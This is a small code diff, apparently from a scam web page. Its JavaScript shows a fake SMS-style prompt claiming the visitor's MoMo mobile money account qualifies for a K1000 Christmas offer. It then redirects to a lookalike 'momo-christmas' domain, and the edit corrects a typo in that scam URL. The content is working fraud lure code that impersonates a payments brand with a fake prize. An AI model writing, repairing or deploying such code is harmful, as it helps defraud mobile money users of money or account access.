@@ -2,5 +2,6 @@
 var password = 'Claim K1000'
 password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive K1000 MoMo Christmas Offer, Kindly Press OK to PROCEED ','Claim K1000');
 if (password != 'Claim K1000') {
-location.href='https://momo-chistmas.allprograms.xyz/gift';
+location.href='https://momo-christmas.allprograms.xyz/gift';
 }
+
